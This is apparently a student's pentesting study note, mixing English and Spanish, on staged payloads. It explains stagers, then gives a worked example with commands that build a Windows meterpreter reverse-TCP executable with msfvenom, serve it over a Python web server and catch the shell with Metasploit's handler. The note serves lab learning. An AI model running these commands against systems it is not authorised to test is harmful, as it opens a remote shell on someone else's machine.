> **Staged payloads** are delivered in two parts: a small initial "stager" that establishes communication with the attacker, followed by the full, functional payload (the "stage").  This approach reduces the initial payload size, enhances stealth by evading detection due to smaller size, and allows dynamic updates to the second stage. However, it requires stable network connectivity, increasing failure risk if communication is disrupted.

- envian nuestro payload de forma fragmentada
- suelen ser inestables
- que sea pequenio lo hace mas facil de transmitir y mas dificil en ser detectado
- pueden ser personalizados

## Caso practico
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=192.168.11.1 LPORT=4646 -f exe -o reverse.exe
```
- Esto se ejecuta desde una compu que tiene linux, por ejemplo, hacia una maquina windows que tenemos acceso por reverse shell
- Luego servimos el archivo mediante un servidor de python
```bash 
python -m http.server 1212
```
- Y luego en la maquina Windows entramos por un navegador y descargamos ese archivo
```bash
msfdb run
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
show options
set LHOST 192.168.11.1
set LPORT 4646
run
